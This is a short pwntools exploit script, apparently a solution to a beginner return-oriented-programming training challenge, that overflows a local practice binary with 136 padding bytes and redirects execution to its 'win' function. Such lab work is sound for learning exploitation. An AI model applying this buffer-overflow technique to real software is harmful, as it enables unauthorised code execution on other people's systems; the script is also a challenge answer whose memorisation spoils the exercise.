from pwn import *


offset = 136
proc = process('/challenge/babyrop_level1.1')
elf = ELF('/challenge/babyrop_level1.1')
win = elf.sym['win']
proc.recv()
payload = b'A' * (offset) + p64(win)
proc.sendline(payload)
print(proc.interactive())
